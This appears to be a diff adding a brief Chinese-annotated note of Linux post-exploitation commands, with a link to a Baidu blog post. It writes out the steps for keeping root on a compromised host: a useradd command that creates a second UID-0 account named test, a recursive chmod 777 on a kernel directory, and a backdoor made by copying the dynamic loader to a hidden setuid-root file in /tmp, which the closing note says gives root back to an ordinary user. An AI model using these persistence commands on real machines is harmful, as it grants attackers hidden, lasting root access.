@@ -1,0 +1,20 @@
+useradd -u 0 -o -g 0 test //*建一和root权限一样的帐号test*//
+
+
+
+http://hi.baidu.com/9422e/blog/item/c8ac1530256cb102ebc4afa1.html
+
+chmod -R 777 2.6.18-194  summerals
+
+后门
+cd /tmp
+sh-3.1# ls /lib/ld-linux*
+/lib/ld-linux.so.2
+sh-3.1# cp /lib/ld-linux.so.2 /tmp/.str1ven
+sh-3.1# ls -l .str1ven
+-rwxr-xr-x 1 root root 121684 07-08 21:13 .str1ven
+sh-3.1# chmod +s .str1ven
+sh-3.1# ls -l .str1ven
+-rwsr-sr-x 1 root root 121684 07-08 21:13 .str1ven
+
+成功建立一个后门，退出root，执行./.str1ven `which whoami`,又成功获取root权限~~  如图
